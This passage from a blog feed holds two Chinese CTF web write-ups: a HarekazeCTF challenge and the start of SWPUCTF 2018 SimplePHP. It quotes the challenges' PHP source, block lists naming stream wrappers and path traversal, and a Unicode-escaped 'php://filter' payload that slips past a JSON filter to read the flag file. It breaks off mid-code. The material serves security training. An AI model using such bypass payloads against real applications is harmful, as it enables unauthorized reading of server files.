punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// no path traversal</span>    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment">// no stream wrapper</span>    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment">// no data exfiltration</span>    <span class="token string single-quoted-string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span> <span class="token operator">=></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//PHP 输入流中获取请求的主体内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>if判断有三个条件：<br>1、检测传入的内容是否合法也就是<code>is_valid()</code>，传入的内容里面不能含有非法字符，但是没有过滤filter协议<br>2、传入的格式就是json格式<br>3、传入的参数就是page<br>三个条件同时满足的话就会通过<code>file_get_contents</code>得到该文件</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里不绕过的话flag会被覆盖掉，因此使用filter伪协议来绕过（将内容进行base64加密后flag就不会被覆盖了）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为要读取flag文件，但是<code>is_valid()</code>函数将flag和php都过滤了，所以这里还有一个知识点就是:</p><blockquote><p>php的json_decode在遇到unicode编码时会自动把它转换成正常的字符</p></blockquote><p>那么将<code>php://filter/read=convert.base64-encode/resource=/flag</code>进行<a href="https://tool.chinaz.com/tools/unicode.aspx">Unicode编码</a><br><img src="https://img-blog.csdnimg.cn/direct/b5998a581da445da9c4c4a1a7cecc9f3.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/direct/2b057cfdc190400485cb62914ac1568c.png" alt="789"><br>然后将flag进行解码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="http://3143047748.github.io/categories/ctf/"/>
    
    
    <category term="buuctf" scheme="http://3143047748.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-WEB之[SWPUCTF 2018]SimplePHP</title>
    <link href="http://3143047748.github.io/2023/12/13/BUUCTF-WEB%E4%B9%8B-SWPUCTF-2018-SimplePHP/"/>
    <id>http://3143047748.github.io/2023/12/13/BUUCTF-WEB%E4%B9%8B-SWPUCTF-2018-SimplePHP/</id>
    <published>2023-12-13T12:40:16.000Z</published>
    <updated>2023-12-13T12:42:06.551Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>考点：phar反序列化、代码审计<br>当点击查看文件的时候发现可疑点<code>http://120c99fe-157d-4ecc-8b63-b4198d09299f.node4.buuoj.cn:81/file.php?file=</code>读取index.php文件的时候发现可以读取到源码，将源码全部读取过来。<br><img src="https://img-blog.csdnimg.cn/direct/e977ff1fc72743459855cc5407f146a4.png" alt="456"></p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'base.php'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>定位到base.php</p><h3 id="base-php"><a href="#base-php" class="headerlink" title="base.php"></a>base.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>web3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file.php?file=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>查看文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--flag is in f1ag.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里输出了一个REMOTE_ADDR，也就是我的ip地址。也就是首页的IP。也告诉了flag文件名称，估计是让进行文件读取操作</p><blockquote><p>这里需要知道：<strong>REMOTE_ADDR 协议头是不可伪造的</strong></p></blockquote><p>所以漏洞点不在这里</p><h3 id="file-php"><a href="#file-php" class="headerlink" title="file.php"></a>file.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>file_exists()</code>函数来检测<code>file</code>传入的文件是否存在，如果存在，将文件赋值给Show类的$source，并且调用_show()方法，Show类在class文件中。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件名——》file_exists()——》正则过滤》读取。显然这里没有过滤phar协议。</p><h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload_file.php"></a>upload_file.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charest</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">align</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>前端写得很low,请各位师傅见谅!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">     <span class="token selector">p</span><span class="token punctuation">&#123;</span> <span class="token property">margin</span><span class="token punctuation">:</span>0 auto<span class="token punctuation">&#125;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用来上传文件，并且与function,php配合来检查文件合法性：上传的文件经过<code>function.php</code>文件中的<code>upload_file()</code>在检查完文件名合法后给上传的文件重命名</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span> <span 